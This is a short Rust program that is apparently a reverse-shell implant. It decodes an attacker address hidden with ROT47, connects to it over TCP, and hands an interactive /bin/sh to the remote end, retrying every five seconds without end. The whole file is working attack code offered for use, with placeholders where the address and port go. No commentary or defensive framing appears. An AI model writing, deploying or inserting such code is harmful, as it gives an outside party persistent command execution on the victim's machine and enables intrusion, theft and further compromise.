use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio}; 
use std::{thread, time};
use cienli::ciphers::rot::{Rot, RotType};

fn main() {
    let five_seconds = time::Duration::from_millis(5000);
    loop {
        let ipaddr_ciphered = Rot::new("TARGET IP ENCODED WITH ROT47", RotType::Rot47);
        let ipaddr = ipaddr_ciphered.decipher();
        let port = "TARGET PORT";

        let connection_string = format!("{0}:{1}", String::from(ipaddr), port);

        let socket: TcpStream;
        match TcpStream::connect(connection_string) {
            Ok(s) => socket = s,
            Err(_) => {
                thread::sleep(five_seconds);
                continue;
            }
        }

        let fd = socket.as_raw_fd();
        Command::new("/bin/sh")
            .stdin(unsafe { Stdio::from_raw_fd(fd) })
            .stdout(unsafe { Stdio::from_raw_fd(fd) })
            .stderr(unsafe { Stdio::from_raw_fd(fd) })
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    }
}
